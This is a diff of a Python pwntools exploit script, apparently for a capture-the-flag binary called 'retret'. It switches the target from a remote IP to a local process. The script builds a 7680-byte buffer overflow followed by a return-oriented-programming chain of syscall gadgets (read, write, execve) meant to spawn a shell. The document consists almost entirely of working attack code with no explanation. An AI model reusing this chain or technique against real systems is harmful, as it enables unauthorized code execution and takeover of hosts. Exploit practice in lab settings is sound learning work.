@@ -5,13 +5,14 @@ from pwn import *
 #0x08048552: pop eax; pop ecx; ret
 #0x08048580: pop edx ret;
 
-
-p = remote('192.168.0.25', 11111)
+p = process('./retret')
+#p = remote('192.168.0.25', 11111)
 
 exploit = "A"*7680
 
-##############  read(0,0x0804a000, 8);
+# 0x0804a000 GOT
 
+##############  read(0,0x0804a000, 8);
 exploit += p32(0x08048375)  # pop ebx; ret
 exploit += p32(0x0)         # ebx 0
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
@@ -21,8 +22,8 @@ exploit += p32(0x08048580)  # pop edx; ret
 exploit += p32(0x8)         # edx 8
 exploit += p32(0x08048542)  # int 0x80; ret
 
-##############  write(1,0x0804a000, 8);
 
+##############  write(1,0x0804a000, 8);
 exploit += p32(0x08048375)  # pop ebx; ret
 exploit += p32(0x1)         # ebx 1
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
@@ -34,7 +35,6 @@ exploit += p32(0x08048542)  # int 0x80; ret
 
 
 ##############  execve(0x0804a000, 0, 0);
-
 exploit += p32(0x08048375)  # pop ebx; ret
 exploit += p32(0x0804a000)  # ebx 0x0804a000
 exploit += p32(0x08048552)  # pop eax; pop ecx; ret
